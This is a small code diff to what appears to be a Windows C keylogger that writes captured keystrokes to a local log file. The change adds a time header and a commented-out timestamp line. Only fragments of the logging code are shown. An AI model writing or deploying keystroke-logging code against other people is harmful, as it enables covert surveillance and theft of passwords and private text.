@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <conio.h>
 #include <windows.h>
+#include <time.h>
 
 #define PATH "C:/MINOR/logfile.txt" // The path to the log file
 
@@ -108,6 +109,7 @@ int main()
 				if(showKey!=(char)0x00){
 					printf("%c",showKey);
 					log=fopen(PATH,"a+");
+                    //fprintf(log, "\nStarted logging @ %s", ctime(&time)); //to save log time
 					putc(showKey,log);
 					fclose(log);
 				}				
